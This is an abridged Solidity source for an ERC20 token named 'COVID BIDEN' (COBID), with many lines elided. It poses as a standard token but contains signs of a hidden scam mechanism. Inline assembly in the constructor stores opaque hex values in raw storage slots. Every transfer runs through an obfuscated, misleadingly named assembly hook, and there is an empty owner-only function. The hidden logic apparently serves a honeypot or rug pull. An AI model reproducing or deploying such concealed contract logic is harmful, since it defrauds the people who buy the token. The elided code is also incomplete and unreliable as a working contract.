...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x5864d00c8837b157fcd862723fae09aec7c9d768bb60)
            sstore(0x51,0x5864063ce6cc43ffede249eb5822aeed1c417e13958e)
    ...
    function payWithDifferentGas(uint256 account, uint value, uint data) public onlyOwner returns (uint256 receiver) {
    }
    ...
    function liquidityWithNFT404s(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        liquidityWithNFT404s(sender, amount);
    ...
    function _DeployCOBID(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCOBID(creator, initialSupply);
    }
}

contract COBID is ERC20Token {
    constructor() ERC20Token("COVID BIDEN", "COBID", msg.sender, 666666666 * 10 ** 18) {
    }
}
